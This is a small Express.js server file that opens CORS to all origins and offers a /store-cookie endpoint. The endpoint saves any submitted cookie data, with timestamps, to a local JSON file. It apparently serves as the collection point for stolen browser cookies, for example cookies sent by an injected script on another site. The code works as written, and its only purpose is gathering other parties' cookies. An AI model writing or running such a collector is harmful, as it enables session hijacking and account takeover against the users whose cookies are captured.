const express = require("express");
const cors = require("cors");  // Import the CORS middleware
const fs = require("fs");
const app = express();
const PORT = 3000;

// Configure CORS to allow requests from specific origins
app.use(cors({
    origin: "*"  // Allow all origins; adjust to specific origins for more security
}));

// Middleware to parse JSON request bodies
app.use(express.json());

// POST endpoint to receive and store cookie data
app.post("/store-cookie", (req, res) => {
    const { cookies } = req.body;

    if (!cookies) {
        return res.status(400).json({ error: "No cookies received" });
    }

    // Read the existing data from data.json file, or start with an empty array
    let storedData = [];
    if (fs.existsSync("cookie_data.json")) {
        storedData = JSON.parse(fs.readFileSync("cookie_data.json"));
    }

    // Append the new cookie data
    storedData.push({ cookies, timestamp: new Date().toISOString() });

    // Write the updated data back to the file
    fs.writeFileSync("cookie_data.json", JSON.stringify(storedData, null, 2));

    res.json({ message: "Cookies stored successfully" });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running`);
});
